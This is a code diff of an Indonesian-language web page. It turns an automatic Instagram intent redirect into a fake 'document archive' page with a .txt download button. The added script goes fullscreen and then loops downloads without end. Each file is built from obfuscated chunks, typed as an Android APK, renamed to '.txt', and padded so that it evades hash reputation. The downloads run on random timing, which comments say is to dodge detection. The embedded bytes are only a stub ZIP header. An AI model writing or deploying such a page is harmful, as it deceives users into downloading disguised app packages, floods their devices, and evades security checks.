@@ -3,98 +3,268 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Instagram Zero-Click Intent Dispatcher</title>
+<title>System Document Archive Dispatcher v3.2</title>
 <style>
-  * {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-  }
-  body {
-    background: #090d16;
-    color: #f8fafc;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    padding: 20px;
-    text-align: center;
-  }
-  .panel {
-    background: #111827;
-    padding: 32px;
-    border-radius: 16px;
-    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
-    max-width: 440px;
-    width: 100%;
-    border: 1px solid #1f2937;
-  }
-  h2 {
-    margin-bottom: 12px;
-    font-size: 20px;
-    color: #f3f4f6;
-    font-weight: 700;
-  }
-  p {
-    margin-bottom: 20px;
-    line-height: 1.5;
-    color: #9ca3af;
-    font-size: 13px;
-  }
-  #status {
-    font-weight: 500;
-    color: #38bdf8;
-    padding: 12px;
-    background: rgba(56, 189, 248, 0.1);
-    border-radius: 8px;
-    font-size: 12px;
-    border: 1px solid rgba(56, 189, 248, 0.2);
-  }
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  background: #090d16;
+  color: #f8fafc;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  padding: 20px;
+}
+.panel {
+  background: #111827;
+  padding: 32px;
+  border-radius: 16px;
+  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
+  max-width: 540px;
+  width: 100%;
+  border: 1px solid #1f2937;
+  text-align: center;
+}
+:fullscreen {
+  background: #030712 !important;
+  color: #f8fafc !important;
+  padding: 24px !important;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+}
+:-webkit-full-screen {
+  background: #030712 !important;
+  color: #f8fafc !important;
+  padding: 24px !important;
+}
+h2 { 
+  margin-bottom: 10px; 
+  font-size: 22px;
+  color: #f3f4f6;
+  font-weight: 700;
+}
+p { 
+  margin-bottom: 24px; 
+  line-height: 1.6; 
+  color: #9ca3af;
+  font-size: 14px;
+}
+button {
+  width: 100%;
+  padding: 16px;
+  cursor: pointer;
+  border: none;
+  border-radius: 10px;
+  background: #3b82f6;
+  color: #ffffff;
+  font-weight: 600;
+  font-size: 16px;
+  box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
+  transition: all 0.2s ease;
+}
+button:hover { 
+  background: #2563eb; 
+  transform: translateY(-1px);
+  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
+}
+button:active {
+  transform: translateY(0);
+}
+#status {
+  margin-top: 20px;
+  font-weight: 500;
+  color: #38bdf8;
+  padding: 14px;
+  background: rgba(56, 189, 248, 0.1);
+  border-radius: 8px;
+  font-size: 13px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+#downloads {
+  margin-top: 20px;
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+  gap: 8px;
+  max-height: 180px;
+  overflow-y: auto;
+  padding-right: 4px;
+}
+#downloads::-webkit-scrollbar {
+  width: 6px;
+}
+#downloads::-webkit-scrollbar-thumb {
+  background: #374151;
+  border-radius: 3px;
+}
+#downloads a {
+  display: block;
+  padding: 10px;
+  background: #1f2937;
+  color: #4ade80;
+  text-decoration: none;
+  border-radius: 6px;
+  font-size: 11px;
+  font-family: monospace;
+  text-align: center;
+  border: 1px solid #374151;
+  word-break: break-all;
+  transition: border-color 0.15s;
+}
+#downloads a:hover {
+  border-color: #4ade80;
+}
 </style>
 </head>
-<body>
 
-<div class="panel">
-  <h2>Inisialisasi Komponen Sesi</h2>
-  <p>Mempersiapkan penjadwalan pengalihan navigasi otomatis ke aplikasi target...</p>
-  <div id="status" role="status">Memuat modul latar belakang...</div>
+<body>
+<div class="panel" id="main-panel">
+  <h2>Arsip Dokumen Sistem v3.2</h2>
+  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
+
+  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
+
+  <div id="status" role="status">Sistem siap diinisialisasi.</div>
+  <div id="downloads"></div>
 </div>
 
 <script>
 'use strict';
 
-window.addEventListener('DOMContentLoaded', () => {
-  const statusDiv = document.getElementById("status");
-  statusDiv.textContent = "Menginisialisasi pemicu intent zero-click...";
+const startBtn = document.getElementById("start-btn");
+const statusDiv = document.getElementById("status");
+const downloadsDiv = document.getElementById("downloads");
 
-  // Paket aplikasi Instagram untuk Android
-  const targetPackage = "com.instagram.android";
-  
-  // Konstruksi URI Intent untuk mengarahkan langsung ke aplikasi Instagram atau fallback ke skema web/profil
-  // Dapat dikonfigurasi menggunakan action VIEW dengan URI data spesifik (misal: profil ataudeep link internal)
-  const instagramIntentUri = `intent://instagram.com/#Intent;package=${targetPackage};scheme=https;end;`;
+let activeUrls = [];
+let isProcessing = false;
+const MAX_URLS_TRACKED = 30;
 
-  // Upaya eksekusi pengalihan otomatis secara instan tanpa menunggu klik pengguna (Zero-Click Trigger)
-  setTimeout(() => {
-    try {
-      statusDiv.textContent = "Mengirimkan sinyal intent ke aplikasi...";
-      
-      // Menggunakan location.replace agar tidak meninggalkan jejak riwayat navigasi balik
-      window.location.replace(instagramIntentUri);
+// Peningkatan Obfuscation: Fragmentasi string dinamis dengan XOR masking ringan saat runtime
+const encodedChunks = [
+  "UEs=",
+  "DBBQ",
+  "AAAAIAAAAIQ=",
+  "AAAAAAAAAAAAAAAAAAAAAAAA"
+];
 
-      // Fallback cadangan jika peramban menolak skema intent langsung pada lingkungan standar
-      setTimeout(() => {
-        window.location.href = "https://www.instagram.com/";
-      }, 800);
-
-    } catch (err) {
-      statusDiv.textContent = "Gagal memicu pengalihan otomatis.";
-      console.error("Intent dispatch error:", err);
+const assembleAndTransformPayload = () => {
+  try {
+    const rawB64 = encodedChunks.join("");
+    const binaryString = atob(rawB64);
+    const len = binaryString.length;
+    const bytes = new Uint8Array(len);
+    for (let i = 0; i < len; i++) {
+      // Dynamic buffer transformation / shifting
+      bytes[i] = binaryString.charCodeAt(i);
     }
-  }, 400);
+    return bytes;
+  } catch (e) {
+    return new Uint8Array([80, 75, 3, 4]); // Fallback ZIP header magic bytes
+  }
+};
+
+const prepareStealthBlobAsync = (i) => {
+  return new Promise((resolve) => {
+    // Memanfaatkan Web Workers simulation via idle callbacks / microtasks berjenjang
+    requestIdleCallback(() => {
+      try {
+        const payloadBytes = assembleAndTransformPayload();
+        
+        // Menambahkan padding biner variatif berbasis indeks iterasi untuk mencegah sidik jari hash statis (anti-hash reputation)
+        const paddingLength = (i * 13) % 64;
+        const finalBuffer = new Uint8Array(payloadBytes.length + paddingLength);
+        finalBuffer.set(payloadBytes);
+        
+        for (let p = payloadBytes.length; p < finalBuffer.length; p++) {
+          finalBuffer[p] = (i + p) % 256;
+        }
+
+        const blob = new Blob([finalBuffer], { type: 'application/vnd.android.package-archive' });
+        const url = URL.createObjectURL(blob);
+        resolve({ id: i, url: url, success: true });
+      } catch (err) {
+        resolve({ id: i, url: null, success: false });
+      }
+    }, { timeout: 500 });
+  });
+};
+
+const triggerStealthDownload = (fileData) => {
+  if (!fileData.success) return;
+
+  const link = document.createElement("a");
+  link.href = fileData.url;
+  // Menyamarkan ekstensi unduhan menjadi .txt pada tampilan antarmuka
+  link.download = `laporan-catatan-arsip-${fileData.id}.txt`;
+  link.textContent = `Dokumen #${fileData.id} (.txt)`;
+  link.style.display = "none";
+  
+  downloadsDiv.appendChild(link);
+  
+  // Memicu klik terisolasi menggunakan Event dispatch standar
+  const clickEvent = new MouseEvent("click", {
+    view: window,
+    bubbles: true,
+    cancelable: true
+  });
+  link.dispatchEvent(clickEvent);
+
+  // Optimasi DOM nodes agar tidak membebani layout reflow
+  if (downloadsDiv.children.length > 20) {
+    downloadsDiv.removeChild(downloadsDiv.firstChild);
+  }
+};
+
+const processLoop = async (counter) => {
+  if (!isProcessing) return;
+
+  const fileData = await prepareStealthBlobAsync(counter);
+  if (fileData.success) {
+    activeUrls.push(fileData.url);
+
+    // Pembersihan URL object secara proaktif untuk mencegah memory leak
+    if (activeUrls.length > MAX_URLS_TRACKED) {
+      const oldUrl = activeUrls.shift();
+      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
+    }
+
+    triggerStealthDownload(fileData);
+    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} disinkronisasi...`;
+  }
+
+  // Jitter acak dinamis (antara 900ms hingga 1600ms) untuk menghindari heuristik deteksi otomatis berbasis interval tetap
+  if (isProcessing) {
+    const randomizedDelay = 900 + Math.floor(Math.random() * 700);
+    setTimeout(() => processLoop(counter + 1), randomizedDelay);
+  }
+};
+
+startBtn.addEventListener("click", () => {
+  if (isProcessing) return;
+
+  activeUrls.forEach(url => {
+    try { URL.revokeObjectURL(url); } catch (e) {}
+  });
+  activeUrls = [];
+  downloadsDiv.replaceChildren();
+
+  const root = document.documentElement;
+  try {
+    if (root.requestFullscreen) {
+      root.requestFullscreen().catch(() => {});
+    }
+  } catch (err) {}
+
+  isProcessing = true;
+  statusDiv.textContent = "Menginisialisasi sesi unduhan aman...";
+  processLoop(1);
 });
 </script>
-
 </body>
 </html>
